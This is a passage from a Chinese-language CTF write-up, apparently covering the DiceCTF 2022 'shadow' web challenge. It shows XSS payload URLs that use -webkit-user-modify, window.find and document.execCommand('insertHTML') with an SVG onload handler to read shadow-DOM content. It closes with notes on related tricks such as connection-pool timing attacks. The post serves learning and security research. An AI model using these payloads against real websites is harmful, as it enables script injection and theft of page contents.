（話說上面的是舊版，新版在這裡：[third_party/blink/renderer/core/css/css_properties.json5](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/css/css_properties.json5)，相關說明在這裡：[third_party/blink/renderer/core/style/ComputedStyle.md](https://chromium.googlesource.com/chromium/src.git/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/style/ComputedStyle.md)）


我就一個一個看，看有沒有哪個比較特別的，就找到了 `-webkit-user-modify` 這個屬性，來看一下 MDN: https://developer.mozilla.org/en-US/docs/Web/CSS/user-modify

看起來這屬性就跟 `contenteditable` 差不多，既然變成 `contenteditable`，自然而然就會想到 [document.execCommand](https://developer.mozilla.org/zh-TW/docs/Web/API/Document/execCommand)，而這裡面有個 `insertHTML` 的指令，看起來很有機會。

於是我就在 console 上面試了半天，試了像是 `document.execCommand('insertHTML',false,'<img src=x onerror=console.log(this.parentNode)')` 之類的東西，但是 console 顯示出 `null`，我想說可能不是這個解吧，於是到這邊就放棄了。

看了賽後的 writeup：[https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md](https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md)，發現其實我的方向完全是正確的，只是有兩個關鍵點沒找到。

第一個關鍵點是要先 focus 那段文字再執行 insertHTML，這個我之前有試過 `.focus()` 但沒用，第二個關鍵點是要用 svg 才能成功。

先放一下成功的 payload：

```
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">
```

先用 `window.find` 去 focus 內容之後，再執行 `document.execCommand` 去插入 HTML，然後透過 `svg` 的 event 去執行 JS 拿到節點

底下是幾個會失敗的 payload：

```
// 沒有 focus
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="document.execCommand('insertHTML',false,'<svg/onload=alert(this.parentNode.innerHTML)>')">

// 用了不是 svg 的元素，會讀不到 this.parentNode
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('insertHTML',false,'<img/src=x+onerror=alert(this.parentNode.innerHTML)>')">
```

但神奇的事情是，如果在前面先加上 `document.exec('selectAll')`，就可以：

```
https://aszx87410.github.io/demo/misc/shadow.html?y=-webkit-user-modify:+read-write&x=<img+src=x+onerror="find('steal me');document.execCommand('selectAll');document.execCommand('insertHTML',false,'<img/src=x+onerror=alert(this.parentNode.parentNode.innerHTML)>')">
```

為什麼會有這個差異呢？我也不知道，解出來的人似乎也不知道XD

除了學到 [window.find](https://developer.mozilla.org/en-US/docs/Web/API/Window/find) 這個神奇的 API 以外，從 Discord 的賽後討論也學到了另一個隱藏 API：`document.execCommand('findString', false, 'steal')`，他們說是從 Chromium source code 裡面看到的：https://chromium.googlesource.com/chromium/src/+/refs/tags/100.0.4875.3/third_party/blink/renderer/core/editing/commands/editor_command_names.h#35

這邊留下三個坑，未來有機會再補：

1. 研究一下所有 `document.execCommand` 可以執行的指令
2. 研究一下所有 global function
3. 研究一下所有 Chrome 支援的 CSS 屬性

## 總結

雖然 10 題裡面只打出 1 題 web，但還是收穫滿滿，筆記一下這次學到的新知識：

1. Node.js 會把模組用 function 包起來
2. 不能用 `import "fs"` 但可以用 `import("fs").then()`
3. JS 有些字元轉大小或小寫之後長度會變
4. `RegExp.input` 也就是 `RegExp.$_`，可以拿到最後比對的輸入
5. `<svg><svg onload=alert()>` 是同步執行的，這個真的神奇
6.  可以把 connection pool 塞滿來執行 timing attack
7. `-webkit-user-modify` 可以做到跟 `contenteditable` 差不多的事情
8. `window.find` 跟 `document.execCommand('findString', false, 'steal')` 可以反白選取相對應字串

感覺這次學到的技巧其他 CTF 也很有機會派上用場。